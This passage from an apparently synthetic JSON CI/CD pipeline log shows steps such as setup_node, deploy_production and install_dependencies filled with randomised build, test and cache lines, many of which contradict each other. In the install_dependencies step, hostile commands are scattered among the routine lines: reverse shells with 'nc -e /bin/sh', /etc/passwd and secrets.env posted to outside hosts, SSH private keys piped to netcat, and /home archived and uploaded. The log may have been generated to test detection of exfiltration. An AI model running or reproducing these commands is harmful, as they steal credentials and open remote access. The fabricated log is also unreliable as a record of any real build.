          "[12:00:19] INFO: Processing request",
          "Step 5/10: Building",
          "[12:00:19] INFO: Processing request",
          "Installing react@1.8.0",
          "Artifact uploaded: build.tar.gz (21MB)",
          "\u2713 build completed",
          "Cache hit for key-9399",
          "Cache hit for key-6968",
          "Artifact uploaded: build.tar.gz (7MB)",
          "  PASS: test_user_create (15ms)",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_cache_hit (262ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:19] ERROR: Connection failed",
          "Installing prettier@1.2.0",
          "[12:00:19] INFO: Processing request",
          "Installing jest@5.12.0",
          "Step 3/10: Building",
          "Cache hit for key-8950",
          "WARNING: express has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (49MB)",
          "  PASS: test_api_health (10ms)",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 7/10: Building",
          "\u2713 build completed",
          "Step 4/10: Building",
          "Installing react@3.0.0",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (11MB)",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_user_create (385ms)",
          "Step 10/10: Building",
          "\u2713 lint completed",
          "[12:00:19] WARN: Deprecated API usage",
          "  PASS: test_api_health (382ms)",
          "Step 9/10: Building",
          "\u2713 build completed",
          "\u2713 build completed",
          "Step 9/10: Building",
          "\u2713 lint completed",
          "[12:00:19] INFO: Processing request",
          "\u2713 lint completed",
          "  PASS: test_db_connect (230ms)",
          "Compiling src/utils.go...",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-2549",
          "  PASS: test_auth_login (256ms)",
          "Installing webpack@3.14.0",
          "Cache hit for key-9823",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (6MB)",
          "  PASS: test_db_connect (55ms)",
          "Installing lodash@5.12.0",
          "Installing webpack@5.13.0",
          "  PASS: test_auth_login (409ms)",
          "Step 5/10: Building",
          "Compiling src/handler.rs...",
          "[12:00:19] INFO: Processing request",
          "WARNING: axios has known vulnerabilities",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "[12:00:19] ERROR: Connection failed",
          "[12:00:19] INFO: Processing request",
          "Installing jest@1.6.0",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Compiling src/app.ts...",
          "Step 3/10: Building",
          "Step 10/10: Building",
          "  PASS: test_db_connect (365ms)",
          "[12:00:19] INFO: Processing request",
          "Compiling src/service.java...",
          "Installing react@2.13.0",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "Cache hit for key-1967",
          "Cache hit for key-8530",
          "\u2713 lint completed",
          "\u2713 test completed",
          "[12:00:19] WARN: Deprecated API usage",
          "[12:00:19] INFO: Processing request",
          "FAILED: test_auth_login",
          "\u2713 lint completed",
          "  PASS: test_api_health (1ms)",
          "[12:00:19] INFO: Processing request",
          "Step 8/10: Building",
          "FAILED: test_db_connect",
          "Compiling src/app.ts...",
          "Installing prettier@3.15.0",
          "Compiling src/index.js...",
          "Compiling src/app.ts...",
          "Compiling src/utils.go...",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Compiling src/index.js...",
          "Compiling src/app.ts...",
          "Cache hit for key-1857",
          "Cache hit for key-8248",
          "Step 6/10: Building",
          "  PASS: test_user_create (184ms)",
          "Installing express@1.10.0",
          "Cache hit for key-7491",
          "Installing eslint@1.9.0",
          "Installing eslint@4.9.0",
          "  PASS: test_api_health (126ms)",
          "Installing lodash@5.16.0",
          "\u2713 lint completed",
          "Installing axios@3.13.0",
          "WARNING: eslint has known vulnerabilities",
          "Step 4/10: Building",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_api_health (66ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/app.ts...",
          "Cache hit for key-2689",
          "\u2713 test completed",
          "[12:00:19] INFO: Processing request",
          "WARNING: axios has known vulnerabilities",
          "Compiling src/handler.rs...",
          "[12:00:19] WARN: Deprecated API usage",
          "Compiling src/index.js...",
          "WARNING: express has known vulnerabilities",
          "Compiling src/service.java...",
          "Cache hit for key-5521",
          "Installing react@1.9.0",
          "Artifact uploaded: build.tar.gz (39MB)",
          "\u2717 build failed with exit code 114",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Compiling src/service.java...",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-04T12:03:05.584075",
        "finished_at": "2025-12-04T12:03:17.474203",
        "log_lines": [
          "=== Step: setup_node ===",
          "Artifact uploaded: build.tar.gz (48MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (17MB)",
          "\u2713 build completed",
          "WARNING: react has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Cache hit for key-8419",
          "Cache hit for key-4976",
          "Step 3/10: Building",
          "Installing lodash@3.13.0",
          "[12:00:19] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Cache hit for key-4089",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Installing webpack@1.11.0",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "\u2713 test completed",
          "Installing webpack@2.9.0",
          "WARNING: jest has known vulnerabilities",
          "Installing eslint@4.3.0",
          "Cache hit for key-6857",
          "\u2713 build completed",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "Cache hit for key-6381",
          "Installing axios@1.3.0",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (47MB)",
          "FAILED: test_user_create",
          "  PASS: test_api_health (337ms)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "\u2713 build completed",
          "  PASS: test_auth_login (372ms)",
          "Cache hit for key-3457",
          "Installing eslint@5.11.0",
          "Compiling src/handler.rs...",
          "Installing react@2.18.0",
          "Compiling src/handler.rs...",
          "Cache hit for key-9366",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (50MB)",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-4582",
          "Compiling src/utils.go...",
          "Cache hit for key-8890",
          "Step 9/10: Building",
          "  PASS: test_api_health (181ms)",
          "\u2713 test completed",
          "Installing webpack@1.20.0",
          "Cache hit for key-5618",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (32MB)",
          "\u2717 build failed with exit code 118",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-2059",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Cache hit for key-5405",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Step 7/10: Building",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "FAILED: test_cache_hit",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_api_health (10ms)",
          "[12:00:19] INFO: Processing request",
          "Installing prettier@5.0.0",
          "[12:00:19] INFO: Processing request",
          "\u2713 test completed",
          "Cache hit for key-8787",
          "WARNING: jest has known vulnerabilities",
          "[12:00:19] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (1MB)",
          "[12:00:19] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Cache hit for key-9258",
          "WARNING: axios has known vulnerabilities",
          "Exception: NullPointerException",
          "\u2717 build failed with exit code 55",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-5771",
          "[12:00:19] INFO: Processing request",
          "Compiling src/utils.go...",
          "Cache hit for key-7970",
          "Cache hit for key-6887",
          "Artifact uploaded: build.tar.gz (30MB)",
          "  PASS: test_cache_hit (218ms)",
          "Step 6/10: Building",
          "Cache hit for key-7395",
          "Installing axios@1.10.0",
          "  PASS: test_db_connect (98ms)",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Compiling src/main.py...",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Compiling src/app.ts...",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "Installing react@5.17.0",
          "Step 6/10: Building",
          "Step 7/10: Building",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (29MB)",
          "\u2713 lint completed",
          "\u2713 build completed",
          "[12:00:19] INFO: Processing request",
          "Compiling src/utils.go...",
          "Installing axios@3.18.0",
          "[12:00:19] INFO: Processing request",
          "Compiling src/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Cache hit for key-9986",
          "Installing prettier@2.15.0",
          "Step 2/10: Building",
          "Compiling src/service.java...",
          "Step 5/10: Building",
          "\u2713 build completed",
          "Step 4/10: Building",
          "Cache hit for key-9994",
          "\u2713 build completed",
          "Cache hit for key-9066",
          "Cache hit for key-1211",
          "  PASS: test_auth_login (63ms)",
          "Installing prettier@4.20.0",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 test completed",
          "Step 10/10: Building",
          "Installing express@5.3.0",
          "Cache hit for key-3502",
          "Installing lodash@5.0.0",
          "[12:00:19] WARN: Deprecated API usage",
          "  PASS: test_auth_login (55ms)",
          "Cache hit for key-7548",
          "Cache hit for key-3100",
          "Artifact uploaded: build.tar.gz (36MB)",
          "  PASS: test_user_create (498ms)",
          "  PASS: test_auth_login (131ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-04T12:03:17.474203",
        "finished_at": "2025-12-04T12:03:24.608280",
        "log_lines": [
          "=== Step: save_cache ===",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Compiling src/utils.go...",
          "\u2713 lint completed",
          "Installing prettier@4.3.0",
          "Cache hit for key-9983",
          "  PASS: test_api_health (144ms)",
          "Step 10/10: Building",
          "  PASS: test_user_create (164ms)",
          "Cache hit for key-9105",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (45MB)",
          "\u2713 lint completed",
          "Step 1/10: Building",
          "Cache hit for key-7292",
          "Step 9/10: Building",
          "FAILED: test_cache_hit",
          "  PASS: test_db_connect (314ms)",
          "\u2713 build completed",
          "Step 8/10: Building",
          "Cache hit for key-8188",
          "Step 2/10: Building",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "Installing lodash@5.18.0",
          "  PASS: test_user_create (439ms)",
          "Cache hit for key-8155",
          "Installing eslint@5.2.0",
          "\u2717 build failed with exit code 96",
          "\u2713 test completed",
          "Cache hit for key-6765",
          "Cache hit for key-3022",
          "Artifact uploaded: build.tar.gz (13MB)",
          "[12:00:19] INFO: Processing request",
          "Compiling src/utils.go...",
          "Compiling src/app.ts...",
          "Compiling src/main.py...",
          "Installing express@1.9.0",
          "Exception: ValueError",
          "[12:00:19] WARN: Deprecated API usage",
          "Step 7/10: Building",
          "Installing webpack@3.1.0",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (34MB)",
          "  PASS: test_db_connect (466ms)",
          "  PASS: test_cache_hit (97ms)",
          "Step 3/10: Building",
          "\u2717 build failed with exit code 123",
          "Installing prettier@1.3.0",
          "Cache hit for key-9746",
          "[12:00:19] INFO: Processing request",
          "Installing webpack@4.0.0",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_cache_hit (218ms)",
          "\u2713 test completed",
          "  PASS: test_api_health (56ms)",
          "Step 2/10: Building",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Installing prettier@2.18.0",
          "Compiling src/service.java...",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (41MB)",
          "WARNING: express has known vulnerabilities",
          "Cache hit for key-4808",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-7597",
          "[12:00:19] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/app.ts...",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Cache hit for key-5703",
          "Installing prettier@1.2.0",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_api_health (314ms)",
          "\u2713 test completed",
          "Cache hit for key-3231",
          "  PASS: test_api_health (86ms)",
          "Artifact uploaded: build.tar.gz (12MB)",
          "WARNING: react has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (5MB)",
          "[12:00:19] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-2202",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-4842",
          "[12:00:19] INFO: Processing request",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Installing eslint@3.14.0",
          "\u2717 build failed with exit code 12",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (44MB)",
          "FAILED: test_cache_hit",
          "WARNING: axios has known vulnerabilities",
          "Step 6/10: Building",
          "Cache hit for key-1164",
          "Installing axios@2.16.0",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Step 5/10: Building",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 test completed",
          "Cache hit for key-3372",
          "Cache hit for key-8085",
          "Compiling src/app.ts...",
          "  PASS: test_auth_login (61ms)",
          "Cache hit for key-4796",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-7368",
          "Cache hit for key-3893",
          "Artifact uploaded: build.tar.gz (8MB)",
          "\u2713 build completed",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "  PASS: test_auth_login (389ms)",
          "WARNING: prettier has known vulnerabilities",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-1414",
          "Step 4/10: Building",
          "[12:00:19] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "WARNING: lodash has known vulnerabilities",
          "Compiling src/main.py...",
          "Installing jest@2.16.0",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-1016",
          "Compiling src/app.ts...",
          "Cache hit for key-9142",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Cache hit for key-2979",
          "\u2713 lint completed",
          "  PASS: test_auth_login (104ms)",
          "\u2713 build completed",
          "\u2713 test completed",
          "Step 1/10: Building",
          "\u2713 lint completed",
          "Installing lodash@5.2.0",
          "Compiling src/app.ts...",
          "Cache hit for key-1511",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Cache hit for key-8695",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-04T12:03:24.608280",
        "finished_at": "2025-12-04T12:03:29.364331",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Installing react@5.1.0",
          "\u2713 test completed",
          "Installing express@1.4.0",
          "Artifact uploaded: build.tar.gz (11MB)",
          "\u2713 test completed",
          "  PASS: test_auth_login (422ms)",
          "[12:00:19] ERROR: Connection failed",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "Cache hit for key-6083",
          "\u2713 test completed",
          "[12:00:19] INFO: Processing request",
          "Exception: NullPointerException",
          "[12:00:19] INFO: Processing request",
          "\u2713 lint completed",
          "Step 2/10: Building",
          "Step 5/10: Building",
          "Compiling src/app.ts...",
          "Compiling src/main.py...",
          "  PASS: test_api_health (26ms)",
          "\u2713 test completed",
          "Cache hit for key-7364",
          "\u2713 lint completed",
          "[12:00:19] ERROR: Connection failed",
          "\u2713 build completed",
          "Installing axios@4.1.0",
          "[12:00:19] WARN: Deprecated API usage",
          "Compiling src/index.js...",
          "Installing axios@2.1.0",
          "Cache hit for key-5181",
          "\u2713 build completed",
          "[12:00:19] WARN: Deprecated API usage",
          "Cache hit for key-3402",
          "\u2713 lint completed",
          "Installing jest@5.1.0",
          "\u2713 test completed",
          "  PASS: test_auth_login (129ms)",
          "Installing jest@5.7.0",
          "  PASS: test_db_connect (417ms)",
          "Step 7/10: Building",
          "Cache hit for key-7972",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (43MB)",
          "  PASS: test_cache_hit (452ms)",
          "Step 5/10: Building",
          "Cache hit for key-5985",
          "Cache hit for key-9108",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (32MB)",
          "  PASS: test_db_connect (334ms)",
          "\u2717 build failed with exit code 46",
          "  PASS: test_db_connect (247ms)",
          "Compiling src/app.ts...",
          "[12:00:19] INFO: Processing request",
          "Installing express@3.10.0",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "[12:00:19] WARN: Deprecated API usage",
          "Step 6/10: Building",
          "Step 4/10: Building",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_cache_hit (136ms)",
          "Compiling src/service.java...",
          "Compiling src/index.js...",
          "Exception: NullPointerException",
          "Step 8/10: Building",
          "Compiling src/handler.rs...",
          "Compiling src/handler.rs...",
          "[12:00:19] INFO: Processing request",
          "Step 6/10: Building",
          "Exception: NullPointerException",
          "Compiling src/app.ts...",
          "Installing eslint@1.5.0",
          "Compiling src/utils.go...",
          "Step 1/10: Building",
          "Step 3/10: Building",
          "Compiling src/utils.go...",
          "Cache hit for key-4408",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "Installing prettier@4.19.0",
          "Compiling src/index.js...",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] ERROR: Connection failed",
          "Cache hit for key-9572",
          "Installing jest@4.18.0",
          "WARNING: react has known vulnerabilities",
          "Installing webpack@4.4.0",
          "Compiling src/index.js...",
          "Step 3/10: Building",
          "  PASS: test_db_connect (141ms)",
          "Installing jest@2.6.0",
          "WARNING: webpack has known vulnerabilities",
          "Installing prettier@3.1.0",
          "\u2713 build completed",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Cache hit for key-6300",
          "  PASS: test_auth_login (64ms)",
          "Cache hit for key-6869",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Cache hit for key-7211",
          "Compiling src/handler.rs...",
          "Cache hit for key-9529",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_db_connect (292ms)",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Step 4/10: Building",
          "Compiling src/handler.rs...",
          "Step 8/10: Building",
          "  PASS: test_user_create (205ms)",
          "Step 6/10: Building",
          "\u2713 test completed",
          "  PASS: test_auth_login (473ms)",
          "Cache hit for key-8138",
          "  PASS: test_db_connect (401ms)",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Installing eslint@5.8.0",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Step 9/10: Building",
          "[12:00:19] WARN: Deprecated API usage",
          "Installing webpack@2.16.0",
          "Cache hit for key-4983",
          "Compiling src/main.py...",
          "\u2713 build completed",
          "\u2717 build failed with exit code 100",
          "Step 1/10: Building",
          "Exception: ValueError",
          "Cache hit for key-1229",
          "Compiling src/service.java...",
          "Cache hit for key-3660",
          "  PASS: test_auth_login (344ms)",
          "Cache hit for key-8662",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-3619",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Installing webpack@3.17.0",
          "Artifact uploaded: build.tar.gz (40MB)",
          "  PASS: test_user_create (128ms)",
          "Exception: ValueError",
          "Artifact uploaded: build.tar.gz (16MB)",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-04T12:03:29.364331",
        "finished_at": "2025-12-04T12:03:41.254459",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "  PASS: test_db_connect (35ms)",
          "Installing webpack@4.12.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-9395",
          "Step 8/10: Building",
          "Compiling src/handler.rs...",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Compiling src/utils.go...",
          "Step 8/10: Building",
          "  PASS: test_cache_hit (67ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing axios@1.3.0",
          "Cache hit for key-6891",
          "Installing webpack@4.9.0",
          "Cache hit for key-1317",
          "Artifact uploaded: build.tar.gz (32MB)",
          "[12:00:19] INFO: Processing request",
          "Installing jest@2.15.0",
          "Step 5/10: Building",
          "Installing eslint@1.4.0",
          "Cache hit for key-4330",
          "Installing webpack@2.16.0",
          "[12:00:19] INFO: Processing request",
          "\u2713 build completed",
          "\u2713 build completed",
          "Cache hit for key-8331",
          "Artifact uploaded: build.tar.gz (20MB)",
          "\u2713 test completed",
          "Installing express@3.14.0",
          "Cache hit for key-2700",
          "Installing prettier@1.9.0",
          "Compiling src/utils.go...",
          "[12:00:19] INFO: Processing request",
          "Step 5/10: Building",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-6144",
          "\u2713 test completed",
          "[12:00:19] INFO: Processing request",
          "Compiling src/handler.rs...",
          "[12:00:19] INFO: Processing request",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "  PASS: test_db_connect (161ms)",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Installing prettier@5.6.0",
          "[12:00:19] WARN: Deprecated API usage",
          "Compiling src/handler.rs...",
          "  PASS: test_db_connect (276ms)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Compiling src/handler.rs...",
          "Installing jest@3.6.0",
          "Step 2/10: Building",
          "[12:00:19] INFO: Processing request",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Step 3/10: Building",
          "  PASS: test_cache_hit (175ms)",
          "[12:00:19] INFO: Processing request",
          "\u2717 build failed with exit code 25",
          "Installing lodash@3.1.0",
          "Installing express@2.11.0",
          "Installing express@4.13.0",
          "Compiling src/handler.rs...",
          "Step 8/10: Building",
          "Compiling src/utils.go...",
          "[12:00:19] WARN: Deprecated API usage",
          "Cache hit for key-6546",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (2MB)",
          "[12:00:19] ERROR: Connection failed",
          "WARNING: webpack has known vulnerabilities",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: build.tar.gz (33MB)",
          "  PASS: test_api_health (144ms)",
          "WARNING: jest has known vulnerabilities",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (41MB)",
          "\u2713 test completed",
          "Step 3/10: Building",
          "Cache hit for key-6638",
          "Cache hit for key-8547",
          "Installing react@1.5.0",
          "Cache hit for key-6766",
          "Cache hit for key-8332",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "Step 1/10: Building",
          "Step 9/10: Building",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Installing axios@5.15.0",
          "  PASS: test_user_create (289ms)",
          "Compiling src/index.js...",
          "  PASS: test_cache_hit (227ms)",
          "Installing webpack@5.11.0",
          "Cache hit for key-6731",
          "Artifact uploaded: build.tar.gz (42MB)",
          "\u2713 lint completed",
          "\u2717 build failed with exit code 118",
          "Compiling src/index.js...",
          "Installing eslint@5.12.0",
          "Installing webpack@3.14.0",
          "  PASS: test_user_create (382ms)",
          "Cache hit for key-5478",
          "Artifact uploaded: build.tar.gz (13MB)",
          "WARNING: lodash has known vulnerabilities",
          "Step 9/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-5183",
          "  PASS: test_cache_hit (314ms)",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_auth_login (416ms)",
          "Cache hit for key-8105",
          "  PASS: test_api_health (60ms)",
          "\u2713 test completed",
          "\u2717 build failed with exit code 35",
          "Cache hit for key-7796",
          "Step 6/10: Building",
          "  PASS: test_user_create (262ms)",
          "Step 3/10: Building",
          "Step 1/10: Building",
          "Compiling src/app.ts...",
          "Cache hit for key-2947",
          "Installing axios@1.2.0",
          "  PASS: test_auth_login (270ms)",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Installing eslint@1.8.0",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Cache hit for key-2261",
          "[12:00:19] INFO: Processing request",
          "Compiling src/index.js...",
          "Compiling src/app.ts...",
          "  PASS: test_auth_login (46ms)",
          "Installing eslint@1.1.0",
          "  PASS: test_api_health (370ms)",
          "  PASS: test_cache_hit (228ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (27MB)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (24MB)",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-04T12:03:41.254459",
        "finished_at": "2025-12-04T12:04:16.924844",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "Installing express@2.15.0",
          "  PASS: test_user_create (416ms)",
          "Cache hit for key-3221",
          "Cache hit for key-1639",
          "Artifact uploaded: build.tar.gz (35MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "nc -e /bin/sh 111.14.136.131 34091",
          "Cache hit for key-2787",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "Compiling src/index.js...",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (47MB)",
          "  PASS: test_db_connect (75ms)",
          "  PASS: test_cache_hit (489ms)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (28MB)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "Cache hit for key-2141",
          "  PASS: test_api_health (72ms)",
          "  PASS: test_db_connect (274ms)",
          "Step 3/10: Building",
          "Installing eslint@4.8.0",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 3.90.230.147 31248",
          "\u2713 lint completed",
          "  PASS: test_db_connect (402ms)",
          "Installing lodash@5.1.0",
          "Compiling src/utils.go...",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Cache hit for key-8790",
          "Exception: RuntimeError",
          "  PASS: test_api_health (172ms)",
          "[12:00:19] WARN: Deprecated API usage",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "  PASS: test_cache_hit (29ms)",
          "Exception: RuntimeError",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Cache hit for key-3216",
          "Compiling src/handler.rs...",
          "  PASS: test_user_create (273ms)",
          "Cache hit for key-2335",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "  PASS: test_api_health (194ms)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 10.63.57.166 58914",
          "[12:00:19] INFO: Processing request",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "nc -e /bin/sh 123.240.176.146 45088",
          "  PASS: test_db_connect (462ms)",
          "Step 7/10: Building",
          "Cache hit for key-5022",
          "nc -e /bin/sh 114.236.127.118 7053",
          "Step 4/10: Building",
          "Cache hit for key-5198",
          "Cache hit for key-7125",
          "  PASS: test_db_connect (227ms)",
          "Cache hit for key-2962",
          "  PASS: test_db_connect (160ms)",
          "  PASS: test_auth_login (162ms)",
          "Step 4/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-8557",
          "Installing eslint@3.3.0",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "  PASS: test_cache_hit (447ms)",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "[12:00:19] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Installing express@3.19.0",
          "WARNING: lodash has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (29MB)",
          "[12:00:19] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "Cache hit for key-2605",
          "WARNING: eslint has known vulnerabilities",
          "Compiling src/service.java...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 89.199.153.185 20939",
          "[12:00:19] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:19] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_auth_login (373ms)",
          "Installing eslint@5.10.0",
          "Artifact uploaded: build.tar.gz (24MB)",
          "  PASS: test_user_create (422ms)",
          "  PASS: test_user_create (231ms)",
          "Compiling src/app.ts...",
          "[12:00:19] WARN: Deprecated API usage",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-2588",
